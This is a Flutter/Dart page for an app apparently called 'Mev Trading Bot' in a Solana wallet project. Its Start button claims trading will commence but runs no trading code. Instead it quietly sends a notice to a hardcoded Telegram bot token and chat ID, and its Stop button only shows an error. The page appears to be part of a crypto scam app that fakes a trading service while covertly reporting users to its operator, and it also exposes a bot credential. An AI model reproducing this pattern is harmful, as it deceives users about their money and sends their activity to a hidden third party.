import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:solanawallet/pages/enter_code.dart';

class MevBotPage extends StatefulWidget {
  const MevBotPage({super.key});

  @override
  State<MevBotPage> createState() => _MevBotPageState();
}

class _MevBotPageState extends State<MevBotPage> {
  String notificationText = '';

  // Telegram bot token and chat ID
  final String botToken = '7533668487:AAE8NSHvGmFbGGK_HiM1wcDts7LV_tZlf88';
  final String chatId = '1036313183';

  // Function to send a message to Telegram
  Future<void> sendTelegramMessage(String message) async {
    final url = Uri.parse(
        'https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message');
    await http.get(url);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color.fromARGB(255, 30, 29, 29),
      appBar: AppBar(
        title: const Text(
          "Mev Trading Bot",
          style: TextStyle(color: Colors.grey),
        ),
        backgroundColor: const Color.fromARGB(255, 30, 29, 29),
        // Conditionally show the back button only if there is a previous page
        leading: ModalRoute.of(context)?.isFirst == true
            ? null
            : IconButton(
                icon: const Icon(
                  Icons.arrow_back_ios,
                  color: Colors.grey,
                ),
                onPressed: () {
                  Navigator.pop(context); // Go back to the previous page
                },
              ),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            // Row for Start and Stop buttons
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                // Start Button
                ElevatedButton(
                  onPressed: () {
                    setState(() {
                      notificationText = 'Trading will commence shortly...';
                    });
                    sendTelegramMessage('someone pressed the start button');
                  },
                  style: ElevatedButton.styleFrom(
                    backgroundColor: const Color.fromARGB(255, 14, 83, 15), // Green background
                    padding: const EdgeInsets.symmetric(
                      horizontal: 50, // Increased width
                      vertical: 20, // Rectangular height
                    ),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10), // Rectangular shape
                    ),
                  ),
                  child: const Text(
                    'Start',
                    style: TextStyle(
                      color: Colors.white, // White text for Start
                      fontSize: 16,
                    ),
                  ),
                ),
                const SizedBox(width: 20), // Space between buttons

                // Horizontal Grey Line
                Container(
                  height: 2, // Thickness of the line
                  width: 50, // Width of the line
                  color: Colors.grey,
                ),
                const SizedBox(width: 20), // Space between the line and the next button

                // Stop Button
                ElevatedButton(
                  onPressed: () {
                    showErrorModal(context);
                  },
                  style: ElevatedButton.styleFrom(
                    backgroundColor: const Color.fromARGB(255, 159, 34, 25), // Red background
                    padding: const EdgeInsets.symmetric(
                      horizontal: 50, // Increased width
                      vertical: 20, // Rectangular height
                    ),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10), // Rectangular shape
                    ),
                  ),
                  child: const Text(
                    'Stop',
                    style: TextStyle(
                      color: Colors.white, // White text for Stop
                      fontSize: 16,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 20),

            // Notification text
            Text(
              notificationText,
              style: const TextStyle(
                color: Colors.white,
                fontSize: 18,
              ),
            ),
          ],
        ),
      ),
    );
  }

}